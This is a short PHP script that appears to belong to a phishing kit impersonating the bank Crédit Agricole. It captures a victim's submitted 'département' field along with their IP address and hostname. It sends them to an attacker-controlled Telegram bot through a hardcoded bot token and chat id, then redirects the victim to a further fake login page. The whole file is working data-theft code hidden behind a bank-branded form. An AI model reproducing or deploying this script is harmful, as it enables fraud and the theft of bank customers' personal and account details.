<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
if(!empty($_POST['departement'])){
$message  = "[+]━━━━【🏦 CA / Département 】━━━[+] \n";
$message .= "[📍 Département]  : ".$_POST['departement']."\n";
$message .= "\n";
$message .= "[🔍 IP INFO] = http://www.geoiptool.com/?IP=$ip\n";
$message .= "======[Agricol INFO]=======";
$token = "8942970138:AAGWB2jmCozyKCo1PZX18paXoBFXRPumdm4";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=8933881160&text=" . urlencode($message)."" );
header("Location:./identifiant.php");
}else{
header("Location:./identifiant.php");
}

?>